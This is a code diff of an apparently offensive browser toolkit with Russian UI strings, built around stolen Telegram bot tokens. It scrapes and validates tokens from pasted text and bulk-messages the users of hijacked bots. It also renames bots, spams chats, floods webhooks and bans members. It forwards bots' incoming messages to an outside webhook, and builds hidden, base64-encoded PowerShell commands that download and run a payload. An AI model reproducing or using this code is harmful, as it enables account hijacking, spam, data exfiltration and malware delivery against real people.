+    try{ const j=await (await fetch('https://api.telegram.org/bot'+b.token+'/getMe')).json(); b.valid=!!j.ok; if(j.ok){ b.username=j.result.username; b.name=j.result.first_name; b.id=j.result.id; } }catch{ b.valid=false; }
+    await sleep(200);
+  }
+  saveVault(v); renderVault(); hist('vault_recheck',{n:v.length}); toast('done');
+});
+$('vaultClearDead').addEventListener('click',()=>{ saveVault(loadVault().filter(x=>x.valid)); renderVault(); });
+$('vaultExport').addEventListener('click',()=>{
+  const blob=new Blob([JSON.stringify(loadVault(),null,2)],{type:'application/json'});
+  const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='vault.json'; a.click();
+});
+
+async function vaultFiltered(){
+  const g=$('bulkGroup').value.trim();
+  return loadVault().filter(b=>b.valid && (!g || b.group===g));
+}
+$('bulkMsgUsers').addEventListener('click', async ()=>{
+  const text=$('bulkText').value; if(!text) return alert('текст');
+  const bots=await vaultFiltered(); const log=$('bulkLog'); log.innerHTML='';
+  for(const b of bots){
+    try{
+      const upd=await (await fetch(`https://api.telegram.org/bot${b.token}/getUpdates?limit=100`)).json();
+      const ids=new Set();
+      if(upd.ok) upd.result.forEach(u=>{ const m=u.message; if(m&&m.from) ids.add(m.from.id); });
+      for(const uid of ids){
+        const j=await (await fetch(`https://api.telegram.org/bot${b.token}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(text)}`)).json();
+        log.innerHTML+=`<div class="${j.ok?'ok':'err'}">@${esc(b.username)} → ${uid}: ${j.ok?'ok':esc(j.description||'')}</div>`;
+        await sleep(400);
+      }
+    }catch(e){ log.innerHTML+=`<div class="err">@${esc(b.username)}: ${esc(e.message)}</div>`; }
+  }
+  hist('bulk_msg',{bots:bots.length}); toast('done');
+});
+$('bulkSetName').addEventListener('click', async ()=>{
+  const name=$('bulkName').value.trim(); if(!name) return;
+  const bots=await vaultFiltered(); const log=$('bulkLog'); log.innerHTML='';
+  for(const b of bots){
+    const j=await (await fetch(`https://api.telegram.org/bot${b.token}/setMyName`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name})})).json();
+    log.innerHTML+=`<div class="${j.ok?'ok':'err'}">@${esc(b.username)} name: ${j.ok?'ok':esc(j.description||'')}</div>`;
+    await sleep(300);
+  }
+  hist('bulk_name',{}); toast('done');
+});
+$('bulkSetDesc').addEventListener('click', async ()=>{
+  const description=$('bulkDesc').value.trim(); if(!description) return;
+  const bots=await vaultFiltered(); const log=$('bulkLog'); log.innerHTML='';
+  for(const b of bots){
+    const j=await (await fetch(`https://api.telegram.org/bot${b.token}/setMyDescription`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({description})})).json();
+    log.innerHTML+=`<div class="${j.ok?'ok':'err'}">@${esc(b.username)} desc: ${j.ok?'ok':esc(j.description||'')}</div>`;
+    await sleep(300);
+  }
+  hist('bulk_desc',{}); toast('done');
+});
+$('bulkSetPhoto').addEventListener('click', async ()=>{
+  const f=$('bulkPhoto').files[0]; if(!f) return alert('файл');
+  const bots=await vaultFiltered(); const log=$('bulkLog'); log.innerHTML='';
+  for(const b of bots){
+    try{
+      const fd=new FormData(); fd.append('photo', f, f.name);
+      const j=await (await fetch(`https://api.telegram.org/bot${b.token}/setMyProfilePhoto`,{method:'POST',body:fd})).json();
+      log.innerHTML+=`<div class="${j.ok?'ok':'err'}">@${esc(b.username)} photo: ${j.ok?'ok':esc(j.description||'')}</div>`;
+    }catch(e){ log.innerHTML+=`<div class="err">@${esc(b.username)}: ${esc(e.message)}</div>`; }
+    await sleep(400);
+  }
+  hist('bulk_photo',{}); toast('done');
+});
+
+/* spam */
 let spamStop=false;
 $('spamStart').addEventListener('click', async ()=>{
   const token=($('spamToken').value.trim()||$('token').value.trim());
   const chats=$('spamChats').value.split(/\n+/).map(s=>s.trim()).filter(Boolean);
-  const text=$('spamText').value;
-  const delay=Math.max(100,parseInt($('spamDelay').value,10)||500);
-  const parse=$('spamParse').value;
-  if(!token||!chats.length||!text) return alert('токен/чаты/текст');
+  const text=$('spamText').value; const delay=Math.max(100,+$('spamDelay').value||500); const parse=$('spamParse').value;
+  if(!token||!chats.length||!text) return alert('данные');
   spamStop=false; $('spamStart').disabled=true; $('spamStop').style.display='block';
   const log=$('spamLog'); log.style.display='block'; log.innerHTML='';
   for(const chat of chats){
     if(spamStop) break;
-    try{
-      let url=`https://api.telegram.org/bot${token}/sendMessage?chat_id=${encodeURIComponent(chat)}&text=${encodeURIComponent(text)}`;
-      if(parse) url+='&parse_mode='+parse;
-      const r=await fetch(url); const j=await r.json();
-      log.innerHTML+=`<div class="${j.ok?'ok':'err'}">${esc(chat)}: ${j.ok?'ok':esc(j.description||'')}</div>`;
-    }catch{ log.innerHTML+=`<div class="err">${esc(chat)}: net</div>`; }
+    let url=`https://api.telegram.org/bot${token}/sendMessage?chat_id=${encodeURIComponent(chat)}&text=${encodeURIComponent(text)}`;
+    if(parse) url+='&parse_mode='+parse;
+    try{ const j=await (await fetch(url)).json(); log.innerHTML+=`<div class="${j.ok?'ok':'err'}">${esc(chat)}: ${j.ok?'ok':esc(j.description||'')}</div>`; }
+    catch{ log.innerHTML+=`<div class="err">${esc(chat)} net</div>`; }
     log.scrollTop=log.scrollHeight; await sleep(delay);
   }
-  $('spamStart').disabled=false; $('spamStop').style.display='none'; toast('done');
+  $('spamStart').disabled=false; $('spamStop').style.display='none'; hist('spam',{n:chats.length});
 });
 $('spamStop').addEventListener('click',()=>{ spamStop=true; });
 
-/* token parser */
+/* parse text only */
 $('parseRun').addEventListener('click', async ()=>{
-  const text=$('parseIn').value;
-  const re=/\b(\d{6,}:[A-Za-z0-9_-]{30,})\b/g;
-  const found=[...new Set((text.match(re)||[]))];
-  const out=$('parseOut');
-  out.innerHTML='';
-  if(!found.length){ out.innerHTML='<div class="hint">токенов не найдено</div>'; return; }
-  out.innerHTML=`<div class="hint">${found.length} уникальных — проверка...</div>`;
+  const found=[...new Set(($('parseIn').value.match(/\b\d{6,}:[A-Za-z0-9_-]{30,}\b/g)||[]))];
+  const out=$('parseOut'); out.innerHTML='';
+  if(!found.length){ out.innerHTML='<div class="hint">не найдено</div>'; return; }
   for(const t of found){
     try{
-      const r=await fetch('https://api.telegram.org/bot'+t+'/getMe');
-      const j=await r.json();
+      const j=await (await fetch('https://api.telegram.org/bot'+t+'/getMe')).json();
       if(j.ok){
-        out.innerHTML+=`<div class="msg-item"><div><span class="badge status-ok">VALID</span> <code style="font-size:11px;word-break:break-all">${esc(t)}</code><div class="msg-from">@${esc(j.result.username||'')} · ${esc(j.result.first_name||'')} · id ${j.result.id}</div></div></div>`;
-      } else {
-        out.innerHTML+=`<div class="msg-item"><div><span class="badge status-bad">DEAD</span> <code style="font-size:11px">${esc(t.slice(0,20))}…</code></div></div>`;
-      }
-    }catch{
-      out.innerHTML+=`<div class="msg-item"><div><span class="badge status-bad">NET</span> ${esc(t.slice(0,16))}…</div></div>`;
-    }
+        out.innerHTML+=`<div class="msg-item"><span class="badge status-ok">VALID</span> <code>${esc(t)}</code><div class="msg-from">@${esc(j.result.username)} · ${esc(j.result.first_name)}</div>
+          <button class="btn-sm" type="button" data-psave="${esc(t)}">в Valid</button></div>`;
+      } else out.innerHTML+=`<div class="msg-item"><span class="badge status-bad">DEAD</span> ${esc(t.slice(0,18))}…</div>`;
+    }catch{ out.innerHTML+=`<div class="msg-item"><span class="badge status-bad">NET</span></div>`; }
     await sleep(200);
   }
+  out.querySelectorAll('[data-psave]').forEach(btn=>btn.addEventListener('click', async ()=>{
+    const token=btn.getAttribute('data-psave');
+    const j=await (await fetch('https://api.telegram.org/bot'+token+'/getMe')).json();
+    if(!j.ok) return;
+    const v=loadVault(); if(v.some(x=>x.token===token)) return toast('уже');
+    v.push({token,username:j.result.username,name:j.result.first_name,id:j.result.id,group:'parsed',note:'',valid:true,ts:Date.now()});
+    saveVault(v); toast('saved');
+  }));
+  hist('parse_text',{n:found.length});
 });
 
-/* profile loop */
+/* profile with file */
 let profTimer=null;
 async function applyProfile(){
   const token=($('profToken').value.trim()||$('token').value.trim());
-  const log=$('profLog');
-  if(!token){ log.innerHTML+='<div class="err">токен</div>'; return; }
-  const name=$('profName').value.trim();
-  const desc=$('profDesc').value.trim();
-  const short=$('profShort').value.trim();
-  const photo=$('profPhoto').value.trim();
-  const api=async (method, params)=>{
-    const r=await fetch(`https://api.telegram.org/bot${token}/${method}`,{
-      method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(params)
-    });
-    return r.json();
-  };
-  if(name){
-    const j=await api('setMyName',{name});
-    log.innerHTML+=`<div class="${j.ok?'ok':'err'}">name: ${j.ok?'ok':esc(j.description||'')}</div>`;
-  }
-  if(desc){
-    const j=await api('setMyDescription',{description:desc});
-    log.innerHTML+=`<div class="${j.ok?'ok':'err'}">desc: ${j.ok?'ok':esc(j.description||'')}</div>`;
-  }
-  if(short){
-    const j=await api('setMyShortDescription',{short_description:short});
-    log.innerHTML+=`<div class="${j.ok?'ok':'err'}">short: ${j.ok?'ok':esc(j.description||'')}</div>`;
-  }
-  if(photo){
+  const log=$('profLog'); if(!token) return;
+  const api=async (m,p)=>{ const r=await fetch(`https://api.telegram.org/bot${token}/${m}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)}); return r.json(); };
+  if($('profName').value.trim()){ const j=await api('setMyName',{name:$('profName').value.trim()}); log.innerHTML+=`<div class="${j.ok?'ok':'err'}">name ${j.ok?'ok':esc(j.description||'')}</div>`; }
+  if($('profDesc').value.trim()){ const j=await api('setMyDescription',{description:$('profDesc').value.trim()}); log.innerHTML+=`<div class="${j.ok?'ok':'err'}">desc ${j.ok?'ok':esc(j.description||'')}</div>`; }
+  if($('profShort').value.trim()){ const j=await api('setMyShortDescription',{short_description:$('profShort').value.trim()}); log.innerHTML+=`<div class="${j.ok?'ok':'err'}">short ${j.ok?'ok':esc(j.description||'')}</div>`; }
+  const file=$('profPhotoFile').files[0];
+  if(file){
+    const fd=new FormData(); fd.append('photo', file, file.name);
+    try{ const j=await (await fetch(`https://api.telegram.org/bot${token}/setMyProfilePhoto`,{method:'POST',body:fd})).json();
+      log.innerHTML+=`<div class="${j.ok?'ok':'err'}">photo file ${j.ok?'ok':esc(j.description||'')}</div>`;
+    }catch(e){ log.innerHTML+=`<div class="err">photo ${esc(e.message)}</div>`; }
+  } else if($('profPhotoUrl').value.trim()){
     try{
-      const img=await fetch(photo);
-      const blob=await img.blob();
-      const fd=new FormData();
-      fd.append('photo', blob, 'icon.jpg');
-      const r=await fetch(`https://api.telegram.org/bot${token}/setMyProfilePhoto`,{method:'POST',body:fd});
-      const j=await r.json();
-      log.innerHTML+=`<div class="${j.ok?'ok':'err'}">photo: ${j.ok?'ok':esc(j.description||'')}</div>`;
-    }catch(e){
-      log.innerHTML+=`<div class="err">photo: ${esc(e.message)}</div>`;
-    }
+      const blob=await (await fetch($('profPhotoUrl').value.trim())).blob();
+      const fd=new FormData(); fd.append('photo', blob, 'icon.jpg');
+      const j=await (await fetch(`https://api.telegram.org/bot${token}/setMyProfilePhoto`,{method:'POST',body:fd})).json();
+      log.innerHTML+=`<div class="${j.ok?'ok':'err'}">photo url ${j.ok?'ok':esc(j.description||'')}</div>`;
+    }catch(e){ log.innerHTML+=`<div class="err">${esc(e.message)}</div>`; }
   }
-  log.scrollTop=log.scrollHeight;
+  log.scrollTop=log.scrollHeight; hist('profile',{});
 }
 $('profOnce').addEventListener('click',()=>applyProfile());
 $('profStart').addEventListener('click',()=>{
   if(profTimer) clearInterval(profTimer);
   applyProfile();
-  const sec=Math.max(5,parseInt($('profInterval').value,10)||30);
-  profTimer=setInterval(()=>{ if($('profLoop').checked||true) applyProfile(); }, sec*1000);
-  $('profStart').style.display='none';
-  $('profStop').style.display='block';
-  toast('цикл '+sec+'s');
+  const sec=Math.max(5,+$('profInterval').value||30);
+  profTimer=setInterval(applyProfile, sec*1000);
+  $('profStart').style.display='none'; $('profStop').style.display='block';
 });
-$('profStop').addEventListener('click',()=>{
-  if(profTimer) clearInterval(profTimer);
-  profTimer=null;
-  $('profStart').style.display='block';
-  $('profStop').style.display='none';
-});
+$('profStop').addEventListener('click',()=>{ clearInterval(profTimer); profTimer=null; $('profStart').style.display='block'; $('profStop').style.display='none'; });
 
 /* channels */
 $('chanFromUpdates').addEventListener('click', async ()=>{
-  const token=($('chanToken').value.trim()||$('token').value.trim());
-  if(!token) return alert('токен');
-  const r=await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=100`);
-  const j=await r.json();
+  const token=($('chanToken').value.trim()||$('token').value.trim()); if(!token) return;
+  const j=await (await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=100`)).json();
   if(!j.ok) return;
   const ids=new Set();
   j.result.forEach(u=>{
-    const m=u.message||u.channel_post||u.my_chat_member||u.chat_member;
+    const m=u.message||u.channel_post||u.my_chat_member;
     if(m&&m.chat) ids.add(String(m.chat.id));
     if(u.my_chat_member) ids.add(String(u.my_chat_member.chat.id));
   });
   const cur=$('chanIds').value.trim();
-  const merged=[...new Set([...(cur?cur.split(/\n+/):[]),...ids])].filter(Boolean);
-  $('chanIds').value=merged.join('\n');
-  toast(merged.length+' id');
+  $('chanIds').value=[...new Set([...(cur?cur.split(/\n+/):[]),...ids])].filter(Boolean).join('\n');
+  toast(ids.size+' id');
 });
-
 $('chanScan').addEventListener('click', async ()=>{
   const token=($('chanToken').value.trim()||$('token').value.trim());
   const ids=$('chanIds').value.split(/\n+/).map(s=>s.trim()).filter(Boolean);
-  const out=$('chanOut');
-  out.innerHTML='';
-  if(!token||!ids.length) return alert('токен + ids');
+  const out=$('chanOut'); out.innerHTML=''; if(!token||!ids.length) return;
   for(const id of ids){
     try{
       const chat=await (await fetch(`https://api.telegram.org/bot${token}/getChat?chat_id=${encodeURIComponent(id)}`)).json();
-      let count='?';
+      let count='?'; try{ const c=await (await fetch(`https://api.telegram.org/bot${token}/getChatMemberCount?chat_id=${encodeURIComponent(id)}`)).json(); if(c.ok) count=c.result; }catch{}
+      let admins=[]; try{ const a=await (await fetch(`https://api.telegram.org/bot${token}/getChatAdministrators?chat_id=${encodeURIComponent(id)}`)).json(); if(a.ok) admins=a.result; }catch{}
+      let rights='—';
       try{
-        const c=await (await fetch(`https://api.telegram.org/bot${token}/getChatMemberCount?chat_id=${encodeURIComponent(id)}`)).json();
-        if(c.ok) count=c.result;
-      }catch{}
-      let admins=[];
-      try{
-        const a=await (await fetch(`https://api.telegram.org/bot${token}/getChatAdministrators?chat_id=${encodeURIComponent(id)}`)).json();
-        if(a.ok) admins=a.result;
-      }catch{}
-      let meRights='—';
-      try{
-        const me=await (await fetch(`https://api.telegram.org/bot${token}/getMe`)).json();
-        if(me.ok){
-          const mem=await (await fetch(`https://api.telegram.org/bot${token}/getChatMember?chat_id=${encodeURIComponent(id)}&user_id=${me.result.id}`)).json();
-          if(mem.ok){
-            const m=mem.result;
-            meRights=m.status+(m.can_post_messages?' post':'')+(m.can_delete_messages?' del':'')+(m.can_restrict_members?' ban':'')+(m.can_promote_members?' promo':'')+(m.can_change_info?' info':'')+(m.can_invite_users?' invite':'');
-          }
+        const me=await (await fetch('https://api.telegram.org/bot'+token+'/getMe')).json();
+        if(me.ok){ const mem=await (await fetch(`https://api.telegram.org/bot${token}/getChatMember?chat_id=${encodeURIComponent(id)}&user_id=${me.result.id}`)).json();
+          if(mem.ok){ const m=mem.result; rights=m.status+(m.can_post_messages?' post':'')+(m.can_restrict_members?' ban':'')+(m.can_change_info?' info':'')+(m.can_invite_users?' invite':''); }
         }
       }catch{}
-      const owners=admins.filter(a=>a.status==='creator').map(a=>'@'+(a.user.username||a.user.id)).join(', ')||'—';
-      const ads=admins.filter(a=>a.status==='administrator').map(a=>'@'+(a.user.username||a.user.id)).join(', ')||'—';
       const title=chat.ok?(chat.result.title||chat.result.username||id):id;
-      const type=chat.ok?chat.result.type:'?';
-      out.innerHTML+=`<div class="chan-card">
-        <h3>${esc(title)}</h3>
-        <div class="chan-meta">id ${esc(id)} · ${esc(type)} · ${esc(String(count))} members</div>
+      const owners=admins.filter(a=>a.status==='creator').map(a=>'@'+(a.user.username||a.user.id)).join(', ')||'—';
+      out.innerHTML+=`<div class="chan-card"><h3>${esc(title)}</h3>
+        <div class="chan-meta">${esc(String(id))} · ${chat.ok?chat.result.type:'?'} · ${count} members</div>
         <div class="chan-meta">owners: ${esc(owners)}</div>
-        <div class="chan-meta">admins: ${esc(ads)}</div>
-        <div class="chan-meta">bot rights: ${esc(meRights)}</div>
-        <button class="btn-sm" type="button" onclick="document.getElementById('actChat').value='${esc(id)}'">в действие</button>
-      </div>`;
-    }catch(e){
-      out.innerHTML+=`<div class="chan-card"><div class="err">${esc(id)}: ${esc(e.message)}</div></div>`;
-    }
-    await sleep(300);
+        <div class="chan-meta">bot: ${esc(rights)}</div>
+        <button class="btn-sm" type="button" onclick="document.getElementById('actChat').value='${esc(String(id))}'">в действие</button></div>`;
+    }catch(e){ out.innerHTML+=`<div class="err">${esc(id)} ${esc(e.message)}</div>`; }
+    await sleep(250);
   }
 });
-
 document.querySelectorAll('[data-act]').forEach(btn=>{
   btn.addEventListener('click', async ()=>{
     const token=($('chanToken').value.trim()||$('token').value.trim());
-    const chat=$('actChat').value.trim();
-    const user=$('actUser').value.trim();
-    const text=$('actText').value.trim();
-    const act=btn.dataset.act;
-    const log=$('actLog');
+    const chat=$('actChat').value.trim(), user=$('actUser').value.trim(), text=$('actText').value.trim(), act=btn.dataset.act;
     if(!token||!chat) return;
-    let url='', body=null;
-    if(act==='spam'){
-      url=`https://api.telegram.org/bot${token}/sendMessage?chat_id=${encodeURIComponent(chat)}&text=${encodeURIComponent(text||'...')}`;
-    } else if(act==='ban'){
-      url=`https://api.telegram.org/bot${token}/banChatMember?chat_id=${encodeURIComponent(chat)}&user_id=${encodeURIComponent(user)}`;
-    } else if(act==='kick'){
-      url=`https://api.telegram.org/bot${token}/banChatMember?chat_id=${encodeURIComponent(chat)}&user_id=${encodeURIComponent(user)}`;
-      await fetch(url);
-      url=`https://api.telegram.org/bot${token}/unbanChatMember?chat_id=${encodeURIComponent(chat)}&user_id=${encodeURIComponent(user)}&only_if_banned=true`;
-    } else if(act==='unban'){
-      url=`https://api.telegram.org/bot${token}/unbanChatMember?chat_id=${encodeURIComponent(chat)}&user_id=${encodeURIComponent(user)}`;
-    } else if(act==='title'){
-      url=`https://api.telegram.org/bot${token}/setChatTitle?chat_id=${encodeURIComponent(chat)}&title=${encodeURIComponent(text||'chat')}`;
-    } else if(act==='invite'){
-      url=`https://api.telegram.org/bot${token}/createChatInviteLink?chat_id=${encodeURIComponent(chat)}`;
-    }
-    try{
-      const r=await fetch(url);
-      const j=await r.json();
-      log.innerHTML+=`<div class="${j.ok?'ok':'err'}">${act}: ${j.ok?(typeof j.result==='object'?JSON.stringify(j.result).slice(0,80):'ok'):esc(j.description||'')}</div>`;
-    }catch(e){ log.innerHTML+=`<div class="err">${act}: ${esc(e.message)}</div>`; }
-    log.scrollTop=log.scrollHeight;
+    let url='';
+    if(act==='spam') url=`https://api.telegram.org/bot${token}/sendMessage?chat_id=${encodeURIComponent(chat)}&text=${encodeURIComponent(text||'...')}`;
+    else if(act==='ban') url=`https://api.telegram.org/bot${token}/banChatMember?chat_id=${encodeURIComponent(chat)}&user_id=${encodeURIComponent(user)}`;
+    else if(act==='kick'){ await fetch(`https://api.telegram.org/bot${token}/banChatMember?chat_id=${encodeURIComponent(chat)}&user_id=${encodeURIComponent(user)}`); url=`https://api.telegram.org/bot${token}/unbanChatMember?chat_id=${encodeURIComponent(chat)}&user_id=${encodeURIComponent(user)}&only_if_banned=true`; }
+    else if(act==='unban') url=`https://api.telegram.org/bot${token}/unbanChatMember?chat_id=${encodeURIComponent(chat)}&user_id=${encodeURIComponent(user)}`;
+    else if(act==='title') url=`https://api.telegram.org/bot${token}/setChatTitle?chat_id=${encodeURIComponent(chat)}&title=${encodeURIComponent(text||'chat')}`;
+    else if(act==='invite') url=`https://api.telegram.org/bot${token}/createChatInviteLink?chat_id=${encodeURIComponent(chat)}`;
+    try{ const j=await (await fetch(url)).json(); $('actLog').innerHTML+=`<div class="${j.ok?'ok':'err'}">${act}: ${j.ok?'ok':esc(j.description||'')}</div>`; hist('chan_act',{act}); }
+    catch(e){ $('actLog').innerHTML+=`<div class="err">${esc(e.message)}</div>`; }
   });
 });
 
@@ -962,83 +878,40 @@ document.querySelectorAll('[data-act]').forEach(btn=>{
 let hookStop=false;
 $('hookStart').addEventListener('click', async ()=>{
   const urls=$('hookUrls').value.split(/\n+/).map(s=>s.trim()).filter(Boolean);
-  let body=$('hookBody').value;
-  const delay=Math.max(100,parseInt($('hookDelay').value,10)||800);
-  const repeat=Math.max(1,Math.min(50,parseInt($('hookRepeat').value,10)||1));
-  if(!urls.length||!body) return alert('url+body');
-  try{ JSON.parse(body); }catch{ body=JSON.stringify({content:body}); }
+  let body=$('hookBody').value; const delay=Math.max(100,+$('hookDelay').value||800); const repeat=Math.max(1,Math.min(50,+$('hookRepeat').value||1));
+  if(!urls.length||!body) return;
+  try{ JSON.parse(body);}catch{ body=JSON.stringify({content:body}); }
   hookStop=false; $('hookStart').disabled=true; $('hookStop').style.display='block';
   const log=$('hookLog'); log.style.display='block'; log.innerHTML='';
-  for(const url of urls){
-    for(let i=0;i<repeat;i++){
-      if(hookStop) break;
-      try{
-        const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body});
-        log.innerHTML+=`<div class="${r.ok||r.status===204?'ok':'err'}">${esc(url.slice(0,40))}… ${r.status}</div>`;
-      }catch{ log.innerHTML+=`<div class="err">net</div>`; }
-      log.scrollTop=log.scrollHeight; await sleep(delay);
-    }
-  }
-  $('hookStart').disabled=false; $('hookStop').style.display='none'; toast('done');
+  for(const url of urls){ for(let i=0;i<repeat;i++){ if(hookStop) break;
+    try{ const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body}); log.innerHTML+=`<div class="${r.ok||r.status===204?'ok':'err'}">${r.status}</div>`; }
+    catch{ log.innerHTML+='<div class="err">net</div>'; }
+    await sleep(delay);
+  }}
+  $('hookStart').disabled=false; $('hookStop').style.display='none'; hist('hook_spam',{});
 });
 $('hookStop').addEventListener('click',()=>{ hookStop=true; });
-
 $('hookFwd').addEventListener('click', async ()=>{
-  const token=($('hookTgToken').value.trim()||$('token').value.trim());
-  const wh=$('hookFwdUrl').value.trim();
-  const log=$('hookFwdLog');
-  if(!token||!wh) return alert('token+wh');
-  log.innerHTML='';
-  try{
-    const r=await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=20`);
-    const j=await r.json();
-    if(!j.ok){ log.innerHTML='<div class="err">'+esc(j.description||'')+'</div>'; return; }
-    for(const u of j.result){
-      const msg=u.message||u.channel_post;
-      if(!msg) continue;
-      const text=msg.text||msg.caption||'[media]';
-      const from=msg.from?(msg.from.username||msg.from.first_name): (msg.chat&&msg.chat.title)||'?';
-      const body=JSON.stringify({content:`**${from}**: ${text}`.slice(0,1900)});
-      const hr=await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body});
-      log.innerHTML+=`<div class="${hr.ok||hr.status===204?'ok':'err'}">${esc(from)} → ${hr.status}</div>`;
-      await sleep(500);
-    }
-  }catch(e){ log.innerHTML+=`<div class="err">${esc(e.message)}</div>`; }
+  const token=($('hookTgToken').value.trim()||$('token').value.trim()); const wh=$('hookFwdUrl').value.trim(); const log=$('hookFwdLog');
+  if(!token||!wh) return;
+  const j=await (await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=20`)).json();
+  if(!j.ok){ log.innerHTML='<div class="err">'+esc(j.description||'')+'</div>'; return; }
+  for(const u of j.result){
+    const msg=u.message||u.channel_post; if(!msg) continue;
+    const text=msg.text||msg.caption||'[media]';
+    const from=msg.from?(msg.from.username||msg.from.first_name):(msg.chat&&msg.chat.title)||'?';
+    const r=await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:`**${from}**: ${text}`.slice(0,1900)})});
+    log.innerHTML+=`<div class="${r.ok||r.status===204?'ok':'err'}">${esc(from)} ${r.status}</div>`; await sleep(400);
+  }
 });
 
-/* checkers */
-$('chkTokenBtn').addEventListener('click', async ()=>{
-  const tokens=$('chkTokens').value.split(/\n+/).map(s=>s.trim()).filter(Boolean);
-  const out=$('chkTokenOut'); out.innerHTML='';
-  for(const t of tokens){
-    try{
-      const j=await (await fetch('https://api.telegram.org/bot'+t+'/getMe')).json();
-      out.innerHTML+=j.ok
-        ?`<div class="msg-item"><div><span class="badge status-ok">OK</span> @${esc(j.result.username||'')}</div></div>`
-        :`<div class="msg-item"><div><span class="badge status-bad">FAIL</span></div></div>`;
-    }catch{ out.innerHTML+=`<div class="msg-item"><span class="badge status-bad">NET</span></div>`; }
-  }
-});
-$('chkHookBtn').addEventListener('click', async ()=>{
-  const urls=$('chkHooks').value.split(/\n+/).map(s=>s.trim()).filter(Boolean);
-  const out=$('chkHookOut'); out.innerHTML='';
-  for(const url of urls){
-    try{
-      const r=await fetch(url); const j=await r.json().catch(()=>({}));
-      out.innerHTML+=`<div class="msg-item"><div><span class="badge ${r.ok?'status-ok':'status-bad'}">${r.status}</span> ${esc(j.name||j.id||'')}</div></div>`;
-    }catch{ out.innerHTML+=`<div class="msg-item"><span class="badge status-bad">NET</span></div>`; }
-  }
-});
+/* hist */
+$('histRefresh').addEventListener('click', renderHist);
+$('histClear').addEventListener('click',()=>{ localStorage.removeItem(LS_HIST); renderHist(); });
 
 /* PS */
-const DIR_MAP={
-  TEMP:{ps:'$env:TEMP',show:'%TEMP%'},
-  LOCALAPPDATA:{ps:'$env:LOCALAPPDATA',show:'%LOCALAPPDATA%'},
-  APPDATA:{ps:'$env:APPDATA',show:'%APPDATA%'},
-  DOWNLOADS:{ps:"[Environment]::GetFolderPath('UserProfile')+'\\\\Downloads'",show:'%USERPROFILE%\\Downloads'},
-  CUSTOM:{ps:null,show:null}
-};
-function filenameFromUrl(u){ try{ const p=new URL(u).pathname.split('/').filter(Boolean).pop()||'payload.bin'; return decodeURIComponent(p.split('?')[0])||'payload.bin'; }catch{ return 'payload.bin'; } }
+const DIR_MAP={TEMP:{ps:'$env:TEMP',show:'%TEMP%'},LOCALAPPDATA:{ps:'$env:LOCALAPPDATA',show:'%LOCALAPPDATA%'},APPDATA:{ps:'$env:APPDATA',show:'%APPDATA%'},DOWNLOADS:{ps:"[Environment]::GetFolderPath('UserProfile')+'\\Downloads'",show:'%USERPROFILE%\\Downloads'},CUSTOM:{ps:null,show:null}};
+function filenameFromUrl(u){ try{ return decodeURIComponent((new URL(u).pathname.split('/').filter(Boolean).pop()||'file.bin').split('?')[0]); }catch{ return 'file.bin'; } }
 function sq(s){ return "'"+String(s).replace(/'/g,"''")+"'"; }
 function buildPs(){
   const url=$('psUrl').value.trim(); if(!url) return null;
@@ -1060,8 +933,7 @@ function buildPs(){
   const cmd=lines.join(';');
   $('psPath').textContent='path: '+dirShow+'\\'+name;
   if($('psB64').checked){
-    const bytes=new TextEncoder().encode(cmd);
-    const utf16=new Uint8Array(bytes.length*2);
+    const bytes=new TextEncoder().encode(cmd); const utf16=new Uint8Array(bytes.length*2);
     for(let i=0;i<bytes.length;i++) utf16[i*2]=bytes[i];
     let bin=''; utf16.forEach(b=>bin+=String.fromCharCode(b));
     return 'powershell -nop -w hidden -enc '+btoa(bin);
@@ -1070,16 +942,12 @@ function buildPs(){
 }
 function renderPs(){ $('psOut').textContent=buildPs()||'—'; }
 $('psDir').addEventListener('change',()=>{ $('psCustomWrap').style.display=$('psDir').value==='CUSTOM'?'block':'none'; renderPs(); });
-['psUrl','psName','psCustom','psHidden','psSilent','psWait','psAdmin','psMkdir','psB64'].forEach(id=>{
-  const el=$(id); if(!el) return;
-  el.addEventListener('input',renderPs); el.addEventListener('change',renderPs);
-});
+['psUrl','psName','psCustom','psHidden','psSilent','psWait','psAdmin','psMkdir','psB64'].forEach(id=>{ const el=$(id); if(el){ el.addEventListener('input',renderPs); el.addEventListener('change',renderPs);} });
 $('psBuild').addEventListener('click',renderPs);
 $('psCopy').addEventListener('click',()=>copyText($('psOut').textContent||''));
 
-/* codec */
 $('codecRun').addEventListener('click',()=>{
-  const inp=$('codecIn').value; const mode=$('codecMode').value; let out='';
+  const inp=$('codecIn').value, mode=$('codecMode').value; let out='';
   try{
     if(mode==='b64e') out=btoa(unescape(encodeURIComponent(inp)));
     else if(mode==='b64d') out=decodeURIComponent(escape(atob(inp.replace(/\s+/g,''))));
@@ -1092,9 +960,8 @@ $('codecRun').addEventListener('click',()=>{
 });
 $('codecCopy').addEventListener('click',()=>copyText($('codecOut').value));
 
-/* keys */
 function genKey(){
-  const len=parseInt($('keyLen').value,10)||32; const alpha=$('keyAlpha').value;
+  const len=+$('keyLen').value||32, alpha=$('keyAlpha').value;
   if(alpha==='uuid') return crypto.randomUUID();
   const chars=alpha==='hex'?'0123456789abcdef':'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789';
   const arr=new Uint8Array(len); crypto.getRandomValues(arr);
@@ -1102,22 +969,417 @@ function genKey(){
 }
 $('keyGen').addEventListener('click',()=>{ $('keyOut').value=genKey(); $('keyList').style.display='none'; });
 $('keyCopy').addEventListener('click',()=>copyText($('keyOut').value));
-$('keyGen5').addEventListener('click',()=>{
-  const lines=[]; for(let i=0;i<5;i++) lines.push(genKey());
-  $('keyList').style.display='block'; $('keyList').textContent=lines.join('\n'); $('keyOut').value=lines[0];
-});
